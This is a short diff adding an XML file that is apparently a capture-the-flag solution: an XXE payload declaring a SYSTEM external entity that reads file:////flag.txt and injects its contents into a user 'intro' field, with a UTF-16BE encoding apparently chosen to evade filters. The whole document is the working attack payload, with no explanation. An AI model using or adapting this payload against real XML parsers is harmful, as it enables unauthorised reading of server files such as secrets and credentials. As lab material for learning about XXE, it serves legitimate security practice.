@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-16BE"?>
+<!DOCTYPE lol [
+<!ENTITY yeee SYSTEM "file:////flag.txt" >
+]>
+<users>
+    <user>
+        <intro>&yeee;</intro>
+    </user>
+</users>
